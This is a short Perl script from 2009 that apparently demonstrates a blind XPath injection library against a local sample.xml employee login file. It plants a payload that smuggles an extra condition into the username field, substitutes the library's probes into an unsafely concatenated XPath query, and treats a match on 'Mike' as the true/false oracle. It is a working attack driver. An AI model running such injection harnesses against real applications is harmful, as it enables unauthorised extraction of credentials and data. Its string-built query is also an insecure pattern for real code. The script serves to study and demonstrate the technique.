# Blind XPath Injection
# Sample code of library using local injection
# 02/06/2009  L.Licour


use strict;
use XML::XPath;

require("blind-xpath-lib.pm");
package BlindXPath;

use Data::Dumper;


my $xml;

sub init
{
  my $file = 'sample.xml';

  $xml = XML::XPath->new(filename => $file);
}

sub verify_result {
  my ($res) = (@_);

  return 1 if ($res =~ /Mike/);

  return 0;
}


sub callback_blind_xpath
{
  my ($arg) = @_;

  my $username = "Mike' and REQ and '1'='1";
  my $password = "test123";

  my $template = "/employees/employee[loginID/text()='" . $username . "' and passwd/text()='" . $password . "']";

  my $req=$template;
  $req =~ s/REQ/$arg/g;

  my $res;
  eval {
    $res = $xml->find($req);
  };
  if ($@) {
    print STDERR "\nXML::XPath Error\n";
    die($@);
  }

  my $verify = verify_result($res);

  return $verify;
}


init();

blind_xpath_start();


